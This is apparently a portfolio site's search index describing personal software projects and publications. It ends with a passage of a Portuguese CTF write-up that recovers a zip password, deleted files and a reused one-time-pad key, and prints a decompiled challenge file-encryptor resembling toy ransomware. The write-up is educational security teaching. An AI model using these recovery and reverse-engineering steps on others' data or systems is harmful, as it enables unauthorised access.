var store = [{
        "title": "Formally#",
        "excerpt":"Formally# is an online formal language designer.   To get a feel for how to use it, open the example project, JSON, and use the buttons to generate a lexer and a parser. After that, you can start typing in the recognition box. Your input will be syntactically checked on the fly.   Features   This is a full-stack functional-style web application built using F# and the SAFE Stack. Source code is available on GitHub.   Notable features include:     Full separation between lexical and syntactical definitions   Conversion of regular expressions to DFAs   Compilation of LL(1) grammars to table-based parsers   Automatic detection of LL(1) conflicts   Test acceptance of input strings on the fly   Project persistency across (unauthenticated) sessions   To-do list:     Automatic generation of random syntactically correct strings, which could be useful for testing purposes   Enforce referential integrity across rules in the UI   Visualize lexer FSMs and syntax diagrams   Screenshots             ","categories": [],
        "tags": [],
        "url": "/portfolio/formallysharp/",
        "teaser": "https://user-images.githubusercontent.com/27034173/129140042-eeba5460-0aa3-4b1c-9a58-8b948beccafe.png"
      },{
        "title": "Video game prototypes",
        "excerpt":"Just like every other computer science student and programmer, I’ve done a bit of indie video game development in personal projects or for game jams such as the UFSC Game Jam (I also helped organize its first editions). This page collects some of those projects.   A basic raycaster with Fable+Elmish        Click the canvas above and press one of the WASD keys to move around.   3D Modeling, Motion Capture and Transfer   Check it out!   Othello against an AI   While following Peter Norvig’s “Paradigms of Artificial Intelligence Programming”, I implemented some of the artificial Othello players described therein.   MoonFable   MoonFable is a short fantasy RPG game mixing turn-based combat and Match-3 casual puzzle mechanics. Made during the UFSC Game Jam 3 using the LÖVE2D framework.   Warning: programmer art ahead.     Source code is available on GitHub and a development timelapse can be seen on YouTube.   Others   Pointers to some of the other projects I’ve developed:   A multiplayer, wizard dueling, LISP programming game.    Necro Crypt by baioc, andersonhn, ccaldas  Sombra by andersonhn, baioc ","categories": [],
        "tags": [],
        "url": "/portfolio/gamedev/",
        "teaser": "/assets/images/moonfable.png"
      },{
        "title": "graf",
        "excerpt":"graf is a command-line utility to plot line charts in your terminal, with colors and in real time. Pair it with tmux and some shell scripts to implement your own Grafana-like TUI dashboards.      Installation   Linux      Download the latest release linux tar.gz   Unpack it: tar -xzf graf.tar.gz   Install it by moving the binary into your path: mv graf /usr/local/bin/   Windows      Download the latest release windows .zip   Unzip it.   Install it by placing the GRAF.EXE binary somewhere in your %PATH%   Usage   Usage: graf [OPTION]...  Options:     -f, --file FILE      If FILE is - or not specified, read from stdin.     -b, --batch          Only plot on end of input (as opposed to real-time).     -t, --title TITLE    Display TITLE on top of the plotted chart.     -s, --stats          Show statistics, which are hidden by default.     -c, --color COLOR    Color to plot the line in. See options below.     -n, --lines N        Plot N &lt;= 8 parallel lines. Default is inferred.     -p, --permissive     Ignore badly-formatted lines instead of halting.     -r, --range MIN:MAX  Fix plot bounds instead of choosing them dynamically.     -d, --digits DIGITS  Ensure at least DIGITS significant digits are printed.     -W, --width WIDTH    Maximum TUI width. Defaults to terminal width.     -H, --height HEIGHT  Maximum TUI height. Defaults to terminal height.     -h, --help           Print this help message and exit the program.  Notes:     - A single quantization range is used for the entire chart, so make sure         timeseries are similarly scaled when there are more than one.     - When the chart includes multiple lines, a default title is added in order         to help disambiguate them; furthermore, each one is colored differently.     - Options '--title' and '--color' can be specified multiple times, in which         case they will be applied to each timeseries in a corresponding position.   Examples   Notice that, in order to plot data as it is streamed in real time, we either turn buffering off completely or flush on every newline.   $ ping example.com \\ | stdbuf -oL tail -n +2 \\ | sed -u 's/.*time=\\(.*\\) ms/\\1/' \\ | graf -t \"ping (ms)\" --stats -W 80 -H 24   $ vmstat -n 1 \\ | stdbuf -oL tr -s ' ' \\ | stdbuf -oL cut -d ' ' -f 14,15,16 \\ | graf -n 3 --permissive --range 0:100 -t \"user%\" -c 'y' -t \"system%\" -c 'r' -t \"idle%\" -c 'g'   $ while curl -sS -L -w '\\n' http://api.coincap.io/v2/rates/bitcoin; do sleep 1; done \\ | sed -u 's/.*\"rateUsd\":\"\\([^\"]*\\)\".*/\\1/' \\ | xargs -L 1 python3 -c 'import sys; print(float(sys.argv[1]) * 1e-8)' \\ | graf -t \"Satoshi price (U\\$D)\" --digits 15 --color cyan   $ python3 -c 'from math import *; [print(sin(4*pi * p/100), cos(4*pi * p/100)) for p in range(0, 100)]' &gt; tmp.tsv $ graf -f tmp.tsv --batch $ rm tmp.tsv     ","categories": [],
        "tags": [],
        "url": "/portfolio/graf/",
        "teaser": "https://user-images.githubusercontent.com/27034173/200157085-7a2ccf83-5966-4f7d-8b50-3d735dd4e188.png"
      },{
        "title": "Padn't",
        "excerpt":"You’ve probably heard of Dontpad before. It essentially implements an online notepad, in which you:     Don’t login, just use a URL   Don’t save, any changes you make are auto-saved   Don’t refresh the page, it happens automatically   Don’t pay or have to watch Ads   Well, Padn’t is a Dontpad clone, built as I was experimenting with Spring Boot and JDK 17.      Unlike Dontpad, however, it is open-source and very easy to self-host. Disclaimer: Padn’t does not handle concurrent editing as well as Dontpad, and it doesn’t even try to avoid making HTTP requests every few seconds to update or refresh the page.  ","categories": [],
        "tags": [],
        "url": "/portfolio/padnt/",
        "teaser": "https://user-images.githubusercontent.com/27034173/221325954-b8131c34-6171-4fcd-ba20-73404346bc6a.png"
      },{
        "title": "PCSEA - Projet Système d'Exploitation",
        "excerpt":"This was a project developed during my exchange in Ensimag which I find particularly interesting: we had to build an Operating System from scratch for an x86 architecture.      Of course, we didn’t need to include every feature a modern Linux distribution might have. In fact, our OS is very simple:     VGA text UI, with a single TTY for a single user.   No files (in fact, the entire thing runs on 256MiB of RAM).   A very primitive shell and not that many syscalls.   However, the reason I like it is that we had the opportunity to really go low on the stack and implement (mostly using C, sometimes resorting to x86/IA-32 assembly):     Drivers for periphals such as the 8259 PIC, the 8253/8254 PIT and PS/2 keyboard and mouse cursor.   Multiple process trees time-sharing a single CPU, with a priority-based preemptive scheduler (although the kernel itself is not preemptive).   Inter-process communication and synchronization mechanisms: message queues and semaphores.   Kernel and user-space separation, including dynamic virtual memory through paging, protection mechanisms and syscalls.   Init daemon and a system shell which allows users to launch programs either in the foreground or in the background.   You can read more about the project and check out its GPL’ed source. Also, shoutout to the OSDev wiki and community, which helped quite a lot.  ","categories": [],
        "tags": [],
        "url": "/portfolio/pcsea/",
        "teaser": "https://github.com/baioc/PCSE-A/assets/27034173/83afab01-a579-409c-b74a-c325e860eb46"
      },{
        "title": "My private PL Zoo",
        "excerpt":"After reading The Wizard Book and going through The SICP lectures, I found myself deeply interested in PL design and implementation. That naturally led me to further reading on the subject, as well as to the development of compilers and interpreters for toy programming languages.   With those projects, I got to learn about and implement:     Compilers for stack-based and register-based target architectures.   Interpreters for dynamically-typed languages.   Garbage collection algorithms.   Virtual Tables for OOP inheritance and dynamic dispatch.   Static typechecking.   Hand-written and tool-generated parsers.   First-class functions, closures and their low-level implementation.   Optimizations such as tail-call elimination, string interning and constant folding.   Different evaluation strategies (nondeterminism, lazyness).   Pattern-matching and unification.   Yet another Scheme Metacircular Evaluator   This is where the magic began: a Scheme interpreter written in Scheme following Chapter 4 of The Wizard Book. Differently than what most people do, however, I kept extending the first evaluator with the variations that followed in the next sections (instead of building them upon a minimal, scratch version).   The result turned up as a macro-less R5RS(-ish) implementation that separates syntactic analysis from the actual interpreter execution and additionally provides built-in amb and try-catch special forms for nondeterministic computing, as well as a retry command in the REPL that backtracks to the most recent nondeterministic fork and tries a different path.          Using the nondeterministic Scheme evaluator to solve the SEND+MORE=MONEY puzzle (source not shown).          Bytecode compiler and VM for Lox   This was my implementation of Robert Nystrom’s Crafting Interpreters single-pass compiler and bytecode virtual machine for the Lox programming language, coming from what is probably the best (also free) beginner-friendly resource for learning about how programming languages are implemented. Most of it is written in standard C99, making use of features such as Flexible Array Members (FAMs), designated struct initializers and Variable-Length Arrays (VLAs, just once).   Notably, Lox is an efficient, dynamically-typed, object-oriented, garbage-collected scripting language with some runtime introspection and support for closures and first-class functions. The implemented clox version uses a hand-written recursive descent (Pratt) parser and compiles down to bytecode targetting a stack-based VM that encompasses a Mark &amp; Sweep GC and includes many useful optimizations such as string interning, NaN boxing and computed gotos for efficient instruction dispatch (requires GCC’s labels-as-values extension).   A minimal BASIC simulator   Wanting to improve my french before going abroad on an exchange program, I decided to acquire some programming-related vocabulary by skimming through the original, untranslated version of Developing Applications With Objective Caml while learning F# instead of OCaml. One example application in Chapter 6 caught my attention: it was a very minimal BASIC interpreter which I extended by implementing system directives (using as reference whatever I could find online about the old Microsoft BASIC) and by adding support for subroutines. The entire simulator is quite short given that BASIC is a very basic simple non-structured imperative language with dynamic types and no notion of scopes or even functions. In fact, a considerable part of its development time was dedicated to the hand-written shift-reduce parser, which was much harder to grasp than the top-down parsers I had coded until then.          Fizz buzz in BASIC. Hopefully the last thing I’ll ever program in this language.        Deca - A compiled subset of Java   I’ve been told all Ensimag students have at least one project in common: the Projet Génie Logiciel (french for “Software Engineering Project”). In this project, students have to work in groups of five to develop, in less than a month and using Agile practices, a full-blown compiler for Deca: a statically-typed, object-oriented language that resembles a subset of Java and is further specified in a 231-page long document that is given to students in the beginning of the project. It compiles down to a register-based architecture – inspired by the 68000 – that is used in Ensimag’s closed-source abstract machine.   The compiler uses ANTLR to generate a lexer and a parser from a description of the accepted tokens and grammar. Those are employed to build the AST that is then processed during the multiple verification and code generation passes that follow. Unfortunately, the project needed to be coded in Java and the initial skeleton used an Interpreter pattern for everything, meaning we had to deal with a ton of trivial files and the usual OOP inheritance abuse (worsened by the fact that the original codebase programmers had apparently never heard of interfaces, only abstract classes). In the end though, I was happy with the test suite we set up – allowing expected output to be written with regular expressions inside comments in the Deca test sources – and the fact that we got to implement virtual method tables and some basic constant folding optimization.   We also had the opportunity to extend the base language with anonymous functions, closures and functional object interfaces. In doing so, I finally scratched the itch to design something better than what Java has for functional types (how it forces users/libraries to define a different interface for every possible function arity, plus specific interfaces for primitive types), using something that looks like Lambda&lt;ArgTypes*,ReturnType&gt;.          Lazy (even) Streams library in Deca-λ (Deca + our functional extension), side by side with the generated assembly code.        Honorable Mentions   Logic programming in lisp   Another one from the venerable Wizard Book: a (lispy) logic programming language interpreter with built-in pattern-matching and unification.   Automata-compiling macros   Here I simply implement the interpreter and the macro-time compiler for the FSM DSL as presented in Shriram Krishnamurthi’s excelent macro tutorial.   Assembling Forth   In order to test my custom CPU, I wrote a simple assembler script in Python to translate a Forth-like assembly language into executable machine code.   Java-embedded Scheme   On another project, I added a tree-walking interpreter to a distributed Java application in order to use Scheme as an embedded scripting language.  ","categories": [],
        "tags": [],
        "url": "/portfolio/plzoo/",
        "teaser": "/assets/images/scheme.png"
      },{
        "title": "Publications",
        "excerpt":"Model checking of distributed algorithms using synchronous programs (Extended)   PDF   Theoretical Computer Science   Special Issue on Stabilization, Safety, and Security of Distributed Systems   Model Checking of Distributed Algorithms Using Synchronous Programs   PDF   Stabilization, Safety, and Security of Distributed Systems   Abstract: The development of trustworthy self-stabilizing algorithms requires the verification of some key properties with respect to the formal specification of the expected system executions. The atomic-state model (ASM) is the most commonly used computational model to reason on self-stabilizing algorithms. In this work, we propose methods and tools to automatically verify the self-stabilization of distributed algorithms defined in that model. To that goal, we exploit the similarities between the ASM and computational models issued from the synchronous programming area to reuse their associated verification tools, and in particular their model checkers. This allows the automatic verification of all safety (and bounded liveness) properties of any algorithm, regardless of any assumptions on network topologies and execution scheduling.   [Re] A Multi-Functional Synthetic Gene Network   PDF   ReScience C: Volume 8, Issue 1   Abstract: Studies in the field of synthetic biology are constantly making additions to biological circuit repositories, as well as to the theoretical understanding of their capabilities. The ability to compute with biomolecules has been demonstrated by many synthetic gene networks, but until recently the majority of such models were engineered to implement the functionality of a single circuit part. Purcell et al. have proposed a network capable of multiple functions, switching between three different behaviours in a programmable fashion. This work provides an open-source implementation in which their in silico experiments were replicated.   Relying on a rate constraint to reduce Motion Estimation complexity   PDF   IEEE International Conference on Acoustics, Speech and Signal Processing (ICASSP)   Abstract: This paper proposes a rate-based candidate elimination strategy for Motion Estimation, which is considered one of the main sources of encoder complexity. We build from findings of previous works that show that selected motion vectors are generally near the predictor to propose a solution that uses the motion vector bitrate to constrain the candidate search to a subset of the original search window, resulting in less distortion computations. The proposed method is not tied to a particular search pattern, which makes it applicable to several ME strategies. The technique was tested in the VVC reference software implementation and showed complexity reductions of over 80% at the cost of an average 0.74% increase in BD-Rate with respect to the original TZ Search algorithm in the LDP configuration.   Eliminação de Candidatos Baseada em Taxa para Algoritmos de Estimação de Movimento na Codificação de Vídeo   PDF   REIC: Artigos do 40º Concurso de Trabalhos de Iniciação Científica (CTIC/CSBC)   Resumo: Este trabalho propõe e avalia uma técnica dedicada à redução do espaço de busca da Estimação de Movimento, uma das etapas mais importantes na codificação de vídeo. Partindo de evidências na literatura que indicariam uma correlação entre o custo estimado da representação de vetores de movimento e as decisões do codificador, o algoritmo proposto utiliza um critério de eliminação de candidatos considerando somente a taxa de bits dos seus respectivos vetores. A técnica foi avaliada no software de referência do padrão VVC e demonstrou, em uma das configurações do codificador, reduções de mais de 80% na área de busca da Estimação de Movimento, com perdas médias na eficiência de codificação de apenas 0,74% em relação ao algoritmo original.  ","categories": [],
        "tags": [],
        "url": "/portfolio/publications/",
        "teaser": "https://raw.githubusercontent.com/baioc/re-multif/master/sbol.png"
      },{
        "title": "PyCG",
        "excerpt":"This is a desktop app for viewing and transforming 3D wireframe models, made as a UFSC Computer Graphics (INE5420) project using Qt for Python. Source code is available on GitHub.         Installation   Use      Download and uncompress the latest release archive.   Install dependencies: pip install -r requirements.txt --user   Execute the application: python3 pycg/app.py   Note: you may optionally pass in OBJ files to be loaded on startup.   ","categories": [],
        "tags": [],
        "url": "/portfolio/pycg/",
        "teaser": "https://user-images.githubusercontent.com/27034173/131598578-02114b0e-6d33-455b-823b-3dfd36b59479.png"
      },{
        "title": "S4PU - Simple Forth Processing Unit",
        "excerpt":"Simple Forth Processing Unit (S4PU) is a 16-bit stack-based CPU that explores some of the ideas seen on Koopman’s “Stack Computers: the new wave”.      Design   The machine runs on a subset of the Forth programming language with 32 instructions, thus being considered a Minimal Instruction Set Computer (MISC) architecture. It fits what Koopman calls the “ML0 design”:     Multiple Stacks: one dedicated to operating data and another to store return addresses.   Large Stack Buffer: although “large” is debatable, here it means the stack resides in on-chip memory and does not consume main memory bandwidth.   0-Operand: there are no operands associated with most instructions’ opcode, the top of the data stack is implicitly used instead.   As is the case with most stack computers, S4PU’s strength and weakness is its simplicity. While performance levels will never reach those of pipelined superscalar processors, stack-based CPUs are generally simpler, cheaper and less power-hungry. This makes them suitable for applications such as embedded systems control. More importantly, designs such as this one are really simple and easy to understand – even more so than didatic MIPS implementations – and have their place, I believe, in teaching Computer Organization and Design.   Implementation   The processor was implemented in VHDL using Altera (which is now a part of Intel) Quartus II and synthesis was targeted at an EP2C35F672C6 chip from the Cyclone II family of FPGAs, so that it could be physically prototyped. Testbench simulations were performed in ModelSim.   In order to program the CPU, a simple assembler program was developed in Python to translate S4PU’s assembly language into Memory Initialization File (.mif) format which was later loaded into the FPGA’s memory cells standing for the computer’s program memory.   I’ve made the whole project, including documentation (pt-BR), available on GitLab.  ","categories": [],
        "tags": [],
        "url": "/portfolio/s4pu/",
        "teaser": "/assets/images/s4pu.png"
      },{
        "title": "Introdução a CTFs em Cibersegurança",
        "excerpt":"Contextualização   O tema da SECCOM (Semana Acadêmica de Ciência da Computação e Sistemas de Informação da UFSC) 2023 foi segurança e criptografia. Durante o evento, fui convidado para palestrar e ajudar a organizar o Hackathon, que neste ano seria focado em CTFs de Cibersegurança e teria mais de 800 reais em premiação para as equipes com melhor colocação.   Além de atuar como jurado do Hackathon (junto de uma Professora e uma veterana do LabSEC da UFSC), eu fiz apresentações na abertura e no encerramento do evento. Na abertura, eu fiz uma breve apresentação da sub-área de cibersegurança e ethical (white-hat) hacking, seguida de uma demonstração (da resolução) de um CTF envolvendo OSINT, forense digital, crypto, engenharia reversa e password cracking.   O objetivo do CTF de demonstração era apresentar algumas técnicas e ferramentas para os alunos de Computação, que normalmente não têm contato com esse tipo de prática no curso. Além disso, eles poderiam começar a pensar em como iriam criar seus próprios desafios para o Hackathon.   No fim da abertura, deixei um desafio para as equipes que quisessem se aventurar a resolver um CTF um pouco mais difícil (e ganhar pontos extras no Hackathon). Haviam 5 flags a serem capturadas no desafio, que estava 100% contido no arquivo ctf.zip, presente no 1o commit do repositório github.com/baioc/seccom-ctf. O formato das flags também foi combinado: elas seguiriam a expressão regular cco{\\w+}, por exemplo cco{example_flag0}.   Sugeri a utilização do Kali Linux para resolver o problema, incrementando uma instalação base da versão 2023.3 com os seguintes pacotes adicionais:  $ sudo apt update $ sudo apt install htop libreoffice gdb xxd ghidra dislocker $ pip install pycryptodome   Writeup do desafio   O texto que segue é um writeup (um “detonado”) do CTF de desafio. Obviamente, ele contém spoilers. Se você está lendo isso mas planeja tentar resolver o CTF sozinho, não continue a leitura.   Disclaimer      Toda a exposição de conteúdo nesta apresentação é feita de forma voluntária e não implica na sua aprovação por qualquer outra entidade.   Demonstrações serão realizadas para fins educacionais; replicar esses procedimentos em sistemas de terceiros pode ser ilegal (vide artigos 154-A e 154-B do Código Penal).   Não existem garantias associadas aos procedimentos demonstrados; o autor não será responsabilizado por qualquer dano originado deles.   Escondido à vista de todos   Ao tentar descompactar o arquivo ctf.zip, vemos:     Um arquivo de texto flag.txt, supostamente contendo nossa primeira flag   Um arquivo snapshot.dd com cerca de 90 MB   Uma página da web salva para visualização offline, noticias-ufsc.html e noticias-ufsc_files/   Extrair os arquivos não é tão simples, pois o pacote zip foi protegido com senha:    A ferramenta unzip pode nos fornecer mais informações sobre o pacote, incluindo algoritmos e taxas de compressão, bem como comentários associados ao pacote e a cada arquivo individual. Nenhuma dessas informações é protegida. Logo de cara, vemos um comentário associado ao arquivo noticias-ufsc.html:    Mais adiante na lista de arquivos, vemos um comentário suspeito associado ao arquivo jquery.js:    Com a senha “5up4h 57r0nk p455wD”, conseguimos extrair o pacote e obter a 1a flag do desafio:  $ cat flag.txt =&gt; cco{pr3P4r3_t0_CRy}   Criptografia quase perfeita   Analisando a página web, vemos que é um rascunho de artigo para o “Notícias UFSC”. O artigo noticia um ataque cibernético sofrido pela SeTIC/UFSC, durante o qual um atacante invadiu a rede da instituição, roubou informações do computador de um dos professores da UFSC e ativou um ransomware para cifrar dados da SeTIC.     Sem encontrar nada de interessante na página web, passamos ao arquivo snapshot.dd. Embora o exiftool não consiga identificar o tipo do arquivo, o file reporta uma tabela de partições do tipo DOS/MBR, juntamente de pelo menos uma partição iniciando no setor 2048:  $ exiftool snapshot.dd =&gt; ExifTool Version Number         : 12.65 File Name                       : snapshot.dd Directory                       : . File Size                       : 94 MB File Modification Date/Time     : 2023:11:06 00:31:27-05:00 File Access Date/Time           : 2023:11:15 14:41:26-05:00 File Inode Change Date/Time     : 2023:11:15 14:18:32-05:00 File Permissions                : -rw-r--r-- Error                           : Unknown file type  $ file snapshot.dd =&gt; snapshot.dd: DOS/MBR boot sector; partition 1 : ID=0xb, start-CHS (0x4,4,1), end-CHS (0x169,104,2), startsector 2048, 182272 sectors   Sabendo que o arquivo é uma imagem de disco (supostamente criado pelo dd, como indica a extensão), podemos utilizar algumas ferramentas do Sleuth Kit para obter mais detalhes sobre o volume:  $ mmls snapshot.dd =&gt; DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors        Slot      Start        End          Length       Description 000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0) 001:  -------   0000000000   0000002047   0000002048   Unallocated 002:  000:000   0000002048   0000184319   0000182272   Win95 FAT32 (0x0b)   Vemos então uma partição FAT32 allocada a partir do setor 2048. Para montar essa partição diretamente no nosso sistema, basta informar ao mount o offset correto:  $ mkdir mnt  $ sudo mount -o offset=$((512*2048)) snapshot.dd mnt/  $ ls -lh mnt/ =&gt; total 512 -rwxr-xr-x 1 root root 17 Nov  6 00:28 flag.otp  $ cat mnt/flag.otp =&gt; ▒�������`7qEJ��  $ ls -lah mnt/ =&gt; total 5.5K drwxr-xr-x 2 root root  512 Dec 31  1969 . drwxr-xr-x 4 kali kali 4.0K Nov 15 14:55 .. -rwxr-xr-x 1 root root  177 Nov  6 00:30 .bash_history -rwxr-xr-x 1 root root   17 Nov  6 00:28 flag.otp   A princípio, vemos apenas um arquivo flag.otp na partição montada. Infelizmente, o conteúdo deste arquivo não é legível no momento.   Em seguida, listamos os arquivos novamente, mas desta vez com a flag -a passada ao programa ls, que faz com que ele liste arquivos escondidos. Percebemos então um arquivo .bash_history, com o seguinte conteúdo:  whoami ls -lh echo 'Lorem ipsum dolor sit amet' | /tmp/one_time_pad &gt; test.otp hexdump -C test.otp rm test.otp /tmp/one_time_pad &gt; flag.otp ls -la rm /tmp/one_time_pad poweroff   O arquivo .bash_history contém, como seu nome indica, o histórico de comandos executados em uma shell do bash. Neste caso, vemos que o arquivo flag.otp foi gerado com um certo programa one_time_pad. Um pouco antes, o mesmo programa é testado, supostamente lendo a entrada “Lorem ipsum dolor sit amet” e gerando o arquivo test.otp. Outra coisa importante que podemos ver é que o programa one_time_pad foi deletado logo depois da criação da flag e antes do desligamento do sistema.   Mesmo sem conhecer o One-Time Pad (OTP), podemos consultar a Wikipedia e entender que é um algoritmo de criptografia que, quando utilizado corretamente, é teoricamente impossível de quebrar. O algoritmo em si é bem simples, com uma única operação XOR (\\(\\oplus\\)) entre os bits da mensagem a ser cifrada (\\(M\\)) e uma chave (\\(K\\)) de uso único: \\(C = K \\oplus M\\)   Na prática, utilizar o OTP corretamente é difícil, e a Wikipedia lista alguns erros comuns:    Não sabemos como a chave foi gerada, mas com base no histórico podemos ver que foi destruída imediatamente (supostamente ela está contida no programa one_time_pad) depois de cifrar a flag. Todavia, vemos também que a chave parece ter sido reutilizada, já que foi primeiro usada para realizar um teste. Com base no histórico, sabemos a string de teste do OTP, mas o cyphertext do teste parece ter sido deletado.   Como temos uma imagem de disco, podemos utilizar outras ferramentas de forense digital do Sleuth Kit para buscar mais informações. Em especial, o fls pode ser usado para listar arquivos na partição, inclusive se foram deletados:  $ fls -r -o 2048 snapshot.dd =&gt; r/r 3:  TEMP        (Volume Label Entry) r/r 5:  .bash_history r/r * 8:        .incidente.tar r/r * 10:       test.otp r/r 12: flag.otp r/r * 15:       ..bash_history.swp v/v 2870771:    $MBR v/v 2870772:    $FAT1 v/v 2870773:    $FAT2 V/V 2870774:    $OrphanFiles   Em seguida, o icat permite recuperar esses arquivos, bastando infomar o número de inode de cada um deles. Assim, conseguimos extrair dois arquivos adicionais que haviam sido deletados, .incidente.tar e test.otp:  $ icat -o 2048 snapshot.dd 8 &gt; snapshot/incidente.tar  $ icat -o 2048 snapshot.dd 10 &gt; snapshot/test.otp  $ ls -lah snapshot/ =&gt; total 70M drwxr-xr-x 2 kali kali 4.0K Nov 15 15:37 . drwxr-xr-x 4 kali kali 4.0K Nov 15 15:36 .. -rw-r--r-- 1 kali kali  177 Nov 15 15:36 bash_history -rw-r--r-- 1 kali kali   17 Nov 15 15:37 flag.otp -rw-r--r-- 1 kali kali  70M Nov 15 15:36 incidente.tar -rw-r--r-- 1 kali kali   27 Nov 15 15:36 test.otp   Entendendo o algoritmo One-Time Pad e sabendo que, na operação XOR:     \\(0\\) é o elemento identidade, ou seja, para todo \\(X\\) temos \\(X \\oplus 0 = X\\)   O inverso de todo elemento é ele mesmo, ou seja, \\(X \\oplus X = 0\\)   A operação é associativa e comutativa   Então, para recuperar a chave OTP e decifrar a flag, basta seguir a lógica:   \\[C_{test} = K \\oplus M_{test} \\\\ \\implies K = M_{test} \\oplus C_{test}\\]  \\[C_{flag} = K \\oplus M_{flag} \\\\ \\implies M_{flag} = K \\oplus C_{flag}\\]  Primeiramente, utilizei o xxd (infelizmente, não vem instalado por padrão no Kali Linux) para codificar os cyphertexts em hexadecimal / base16:  $ xxd -p flag.otp =&gt; 188cb3abd011f6b5db60377115454a8b95  $ xxd -p test.otp =&gt; 3780aeb58f6ecbf4c5266f0e011e6299ed7bb046eeab85a219f44e   Em seguida, podemos utilizar o Python para decodificar o hexadecimal e reverter o One-Time Pad, capturando então a nossa segunda flag:  &gt;&gt;&gt; flag = bytes.fromhex('188cb3abd011f6b5db60377115454a8b95') &gt;&gt;&gt; &gt;&gt;&gt; test = bytes.fromhex('3780aeb58f6ecbf4c5266f0e011e6299ed7bb046eeab85a219f44e') &gt;&gt;&gt; plain = 'Lorem ipsum dolor sit amet'.encode() &gt;&gt;&gt; &gt;&gt;&gt; def xor(A, B): ...     return bytearray(a ^ b for a, b in zip(A, B)) ... &gt;&gt;&gt; key = xor(plain, test) &gt;&gt;&gt; result = xor(key, flag) &gt;&gt;&gt; &gt;&gt;&gt; print(result.decode())  cco{2_T1m35_p4D}   Engenharia reversa   Agora, voltamos nossa atenção ao arquivo incidente.tar, que também havia sido deletado mas que conseguimos recuperar com o Sleuth Kit. Depois de confirmar que o arquivo é, de fato, um pacote TAR, vamos analisar seu conteúdo:  $ tar -tvf incidente.tar =&gt; -rwxr-xr-x kali/kali     16472 2023-11-05 23:54 incidente/encrypt -rw-r--r-- kali/kali       731 2023-11-04 17:45 incidente/email.txt -rw-r--r-- kali/kali  72755795 2023-11-05 23:55 incidente/rec.pdf drwxr-xr-x kali/kali         0 2023-11-05 23:55 incidente/  $ tar -xf incidente.tar  $ ls -lah incidente =&gt; total 70M drwxr-xr-x 2 kali kali 4.0K Nov  5 23:55 . drwxr-xr-x 3 kali kali 4.0K Nov 15 16:11 .. -rw-r--r-- 1 kali kali  731 Nov  4 17:45 email.txt -rwxr-xr-x 1 kali kali  17K Nov  5 23:54 encrypt -rw-r--r-- 1 kali kali  70M Nov  5 23:55 rec.pdf  $ file incidente/* =&gt; incidente/email.txt: Unicode text, UTF-8 text incidente/encrypt:   ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b7c6568f2470f831dfaf12c44a8ef45185f8283e, for GNU/Linux 3.2.0, not stripped incidente/rec.pdf:   PDF document, version \\235.\\221   O conteúdo do arquivo email.txt parece ser um rascunho de mensagem endereçada ao prof. Jean, do Laboratório de Segurança da UFSC (LabSEC):  Boa noite Prof. Jean,   Acho que conseguimos uma pista sobre o ataque. Mesmo assim, vamos precisar da sua ajuda.  Como você já sabe, os hackers ativaram o ransomware depois da exfiltração de dados. A SeTIC nos informou que chegou a capturar o trafego na rede comprometida, mas esses registros foram cifrados também.  Conseguimos identificar 2 arquivos criados na maquina intermediária usada pelos hackers. A hora de criação coincide com a do vazamento, então estamos esperançosos. Um dos arquivos parece ser um PDF, mas não conseguimos visualizar. O outro é um executável que achamos que pode ter sido usado para cifrar os registros da SeTIC.  Estou enviando ambos os arquivos em anexo.   Contamos com sua ajuda. Att,   Bem como indicado na mensagem, parece ter algo de errado com o arquivo rec.pdf, pois não conseguimos visualizá-lo:     Note também que o PDF pesa aproximadamente 70 MB. Livros inteiros em PDF não costumam passar muito de 20 MB, então o tamanho do arquivo é suspeito.   Segundo o email, o executável encrypt pode ter sido usado pelos hackers para cifrar registros da SeTIC. Por questões óbvias de segurança, não pretendemos executar o programa; afinal, não temos a mínima ideia do dano que ele pode causar no nosso sistema.   Felizmente, podemos contar com a ajuda do Ghidra (também não vem instalado por padrão no Kali) para tentar entender o que esse executável fez. Depois de criar um novo projeto e importar o executável encrypt no Ghidra, vemos a decompilação do programa, ou seja, uma reconstrução estimada do código original (supondo que foi escrito em C):     Mesmo com nomes de variáveis feios e formatação duvidosa, conseguimos ter uma ideia do que o programa faz (e as mensagens de log são especialmente descritivas):     O programa precisa ser executado com pelo menos 2 argumentos.            O primeiro argumento é convertido para um número, e printado como um byte.                    A mensagem de log indica que esse byte é uma chave de criptografia.                       O segundo argumento parece ser um path para um arquivo a ser criptografado.           O programa le uma flag da entrada padrão.   O programa chama uma função chamada encrypt, que recebe pelo menos 2 argumentos.            É possível que existam mais argumentos, mas o Ghidra não detectou automaticamente.           Por fim, o programa fecha o arquivo original e é finalizado   Os logs da função encrypt indicam que:     Será emitido um magic number enganoso   A flag crifrada será escrita em seguida   Por fim, os conteúdos cifrados do arquivo serão emitidos   Segue uma listagem completa do código decompilado pelo Ghidra (alterei apenas a assinatura do main):   int main(int argc,char **argv) {   int iVar1;   char *pcVar2;   size_t sVar3;   char local_138 [272];   long local_28;   FILE *local_20;   char *local_18;   byte local_9;    fwrite(\"*** encRIPt0r ***\\n\",1,0x12,stderr);   if (argc &lt; 3) {      fwrite(\"Not enough args!\\n\",1,0x11,stderr);      iVar1 = 1;   }   else {      iVar1 = atoi(argv[1]);      local_9 = (byte)iVar1;      fprintf(stderr,\"Using encryption key 0x%02X ...\\n\",(ulong)local_9);      local_18 = argv[2];      fprintf(stderr,\"... to encrypt file \\'%s\\' (remember to shred the original)\\n\",local_18);      local_20 = fopen(local_18,\"rb\");      if (local_20 == (FILE *)0x0) {         fwrite(\"File does not exist!\\n\",1,0x15,stderr);         iVar1 = 2;      }      else {         fwrite(\"Reading flag from stdin ...\\n\",1,0x1c,stderr);         pcVar2 = fgets(local_138,0x100,stdin);         if (pcVar2 == (char *)0x0) {            fwrite(\"Invalid flag!\\n\",1,0xe,stderr);            iVar1 = 3;         }         else {            sVar3 = strlen(local_138);            local_28 = sVar3 - 1;            encrypt((char *)(ulong)local_9,(int)local_138);            fclose(local_20);            iVar1 = 0;         }      }   }   return iVar1; }  void encrypt(char *__block,int __edflag) {   FILE *in_RCX;   ulong in_RDX;   undefined4 in_register_00000034;   void *__ptr;   FILE *in_R8;   byte local_1028 [4096];   size_t local_28;   uint local_1c;   long local_18;   ulong local_10;    __ptr = (void *)CONCAT44(in_register_00000034,__edflag);   fwrite(\"Emitting misleading magic number ...\\n\",1,0x25,stderr);   fwrite(\"%PDF-\",1,5,in_R8);   fprintf(stderr,\"Writing %lu encrypted flag bytes 